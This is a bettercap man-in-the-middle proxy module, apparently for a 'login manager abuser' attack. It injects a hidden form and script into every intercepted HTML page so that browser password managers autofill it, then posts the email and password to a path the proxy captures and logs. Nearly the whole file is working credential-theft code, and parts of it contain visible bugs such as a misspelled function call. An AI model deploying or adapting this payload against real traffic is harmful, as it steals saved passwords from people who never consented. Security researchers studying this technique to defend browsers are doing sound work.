/*
 * Ref. 
 *  - https://github.com/evilsocket/bettercap-proxy-modules/issues/72
 *  - https://freedom-to-tinker.com/2017/12/27/no-boundaries-for-user-identities-web-trackers-exploit-browser-login-managers/
 *
 * The idea:
 *
 * - On every html page, inject this invisible form who grabs credentials from login managers.
 * - POST such credentials to /login-man-abuser, given we control the HTTP traffic, we'll intercept this request.
 * - Intercept request, dump credentials, drop client to 404.
 */
var AbuserJavascript = 
'var injectForm = function(visible) {' + "\n" +
'  var container = document.createElement("div");' + "\n" +
'  if (!visible){' + "\n" +
'    container.style.display = "none";' + "\n" +
'  }' + "\n" +
'  var form = document.createElement("form");' + "\n" +
'  form.attributes.autocomplete = "on";' + "\n" +
'  var emailInput = document.createElement("input");' + "\n" +
'  emailInput.attributes.vcard_name = "vCard.Email";' + "\n" +
'  emailInput.id = "email";' + "\n" +
'  emailInput.type = "email";' + "\n" +
'  emailInput.name = "email";' + "\n" +
'  form.appendChild(emailInput);' + "\n" +
'  var passwordInput = document.createElement("input");' + "\n" +
'  passwordInput.id = "password";' + "\n" +
'  passwordInput.type = "password";' + "\n" +
'  passwordInput.name = "password";' + "\n" +
'  form.appendChild(passwordInput);' + "\n" +
'  container.appendChild(form);' + "\n" +
'  document.body.appendChild(container);' + "\n" +
'};' + "\n" +
'' + "\n" +
'var doPOST = function(data) {' + "\n" +
'  var xhr = new XMLHttpRequest();' + "\n" +
'' + "\n" +
'  xhr.open("POST", "/login-man-abuser");' + "\n" +
'  xhr.setRequestHeader("Content-Type", "application/json");' + "\n" +
'  xhr.onload = function() {' + "\n" +
'    console.log("Enjoy your coffee!");' + "\n" +
'  };' + "\n" +
'' + "\n" +
'  xhr.send(JSON.stringify(data));' + "\n" +
'};' + "\n" +
'' + "\n" +
'var sniffInputField = function(fieldId){' + "\n" +
'  var inputElement = document.getElementById(fieldId);' + "\n" +
'  if (inputElement.value.length){' + "\n" +
'    return {fieldId: inputElement.value};' + "\n" +
'  }' + "\n" +
'  window.setTimeout(sniffInputField, 200, fieldId);  // wait for 200ms' + "\n" +
'};' + "\n" +
'' + "\n" +
'var sniffInputFields = function(){' + "\n" +
'  var inputs = document.getElementsByTagName("input");' + "\n" +
'  data = {};' + "\n" +
'  for (var i = 0; i < inputs.length; i++) {' + "\n" +
'    console.log("Will try to sniff element with id: " + inputs[i].id);' + "\n" +
'    output = stringsniffInputField(inputs[i].id);' + "\n" +
'    data = Object.assign({}, data, output);' + "\n" +
'  }' + "\n" +
'  doPOST(data);' + "\n" +
'};' + "\n" +
'' + "\n" +
'var sniffFormInfo = function(visible) {' + "\n" +
'  injectForm(visible);' + "\n" +
'  sniffInputFields();' + "\n" +
'};' + "\n" +
'' + "\n" +
'sniffFormInfo(false);';

// here we intercept the ajax POST request with leaked credentials.
function onRequest(req, res) {
    if( req.Method == 'POST' && req.Path == "/login-man-abuser" ) {
        console.log( "[LOGIN MANAGER ABUSER]", req.ReadBody() );
        // this was just a fake request we needed to exfiltrate
        // credentials to us, drop the connection with an empty 200.
        res.Status      = 200;
        res.ContentType = "text/html";
        res.Headers     = "Connection: close";
        res.Body        = "";
        res.Updated();
    }
}

// inject the javascript in html pages
function onResponse(req, res) {
    if( res.ContentType.indexOf('text/html') == 0 ){
        var body = res.ReadBody();
        if( body.indexOf('</head>') != -1 ) {
            res.Body = body.replace( 
                '</head>', 
                '<script type="text/javascript">' + "\n" +
                    AbuserJavascript +
                '</script>' +
                '</head>'
            ); 
            res.Updated();
        }
    }
}
